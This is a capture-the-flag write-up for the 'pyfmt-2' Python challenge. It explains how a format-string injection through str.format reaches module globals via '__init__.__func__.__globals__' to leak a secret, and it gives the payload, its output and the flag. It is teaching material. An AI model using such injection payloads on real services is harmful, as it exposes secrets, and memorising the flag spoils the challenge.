# pyfmt-2

## Write-up

* Challenge source :  

```python
#!/usr/bin/env python3

from flag import FLAG

class CTF:
    def __init__(self, name):
        self.name = name
    def __repr__(self):
        return f"{self.__class__.__name__}({self.name})".format(self=self)

if __name__ == "__main__":
    print(CTF(input("Name: ")))
```

* This program is not so different from the first one except that the `self.flag = FLAG` line has been removed, so it becomes harder to get the flag this time

* We need to find a way to access global variables from within `self`, that way we can access `FLAG`

* Luckily, there is a way :  

```python
self.__init__.__func__.__globals__
```

* Let's try `{self.__init__.__func__.__globals__[FLAG]}` :  

```txt
CTF(b'shellmates{tH3ReS_A_Way_tO_ACc3S$_gL0b4L_vaR$!??}')
```

* You can find an automated solve script [here](./solve.py)

## Flag

`shellmates{tH3ReS_A_Way_tO_ACc3S$_gL0b4L_vaR$!??}`
